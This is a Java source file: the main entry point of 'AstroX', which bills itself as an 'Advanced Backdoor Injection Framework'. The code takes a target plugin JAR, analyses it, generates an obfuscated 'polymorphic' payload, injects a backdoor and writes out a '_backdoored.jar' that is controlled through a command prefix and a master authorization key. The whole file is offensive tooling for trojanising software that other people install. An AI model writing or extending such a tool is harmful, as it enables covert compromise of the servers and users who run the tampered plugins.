package dev.naruto.astrox;

import dev.naruto.astrox.core.*;
import java.io.File;

public class AstroX {
    private static final String VERSION = "1.0.0";
    private static final String BANNER =
            "    ___        __           _  __\n" +
                    "   /   |  ___ / /________  | |/ /\n" +
                    "  / /| | / __/ __/ ___/ _ \\|   / \n" +
                    " / ___ |(__  ) /_/ /  / (_) /   |  \n" +
                    "/_/  |_/____/\\__/_/   \\___/_/|_|  v" + VERSION + "\n" +
                    "Advanced Backdoor Injection Framework\n";

    public static void main(String[] args) {
        System.out.println(BANNER);

        if (args.length < 1) {
            printUsage();
            return;
        }

        File inputJar = new File(args[0]);
        if (!inputJar.exists()) {
            System.err.println("[ERROR] Input file not found: " + args[0]);
            return;
        }

        File outputJar = new File(inputJar.getParentFile(),
                inputJar.getName().replace(".jar", "_backdoored.jar"));

        try {
            System.out.println("[*] Analyzing target plugin...");
            JarAnalyzer analyzer = new JarAnalyzer(inputJar);
            analyzer.analyze();

            System.out.println("[*] Target: " + analyzer.getPluginName());
            System.out.println("[*] Main class: " + analyzer.getMainClass());
            System.out.println("[*] Java version: " + analyzer.getJavaVersion());

            // REMOVED: JDK download (not needed for pre-compiled payloads)
            // System.out.println("[*] Ensuring compatible JDK...");
            // JDKDownloader jdkDownloader = new JDKDownloader();
            // jdkDownloader.ensureJDK(analyzer.getJavaVersion());

            System.out.println("[*] Generating polymorphic payload...");
            PayloadWeaver weaver = new PayloadWeaver(Config.OBFUSCATION_LEVEL);
            byte[] payload = weaver.generatePayload();

            System.out.println("[*] Injecting backdoor...");
            Injector injector = new Injector(inputJar, outputJar);
            injector.inject(analyzer, payload);

            System.out.println("[✓] Injection complete!");
            System.out.println("[✓] Output: " + outputJar.getAbsolutePath());
            System.out.println("[!] Command prefix: " + Config.COMMAND_PREFIX);

        } catch (Exception e) {
            System.err.println("[ERROR] Injection failed: " + e.getMessage());
            e.printStackTrace();
        }
    }

    private static void printUsage() {
        System.out.println("Usage: java -jar AstroX.jar <input.jar>");
        System.out.println("\nConfiguration:");
        System.out.println("  Edit Config.java before compilation to change:");
        System.out.println("  - Command prefix (default: #)");
        System.out.println("  - Master authorization key");
        System.out.println("  - Obfuscation settings");
    }
}
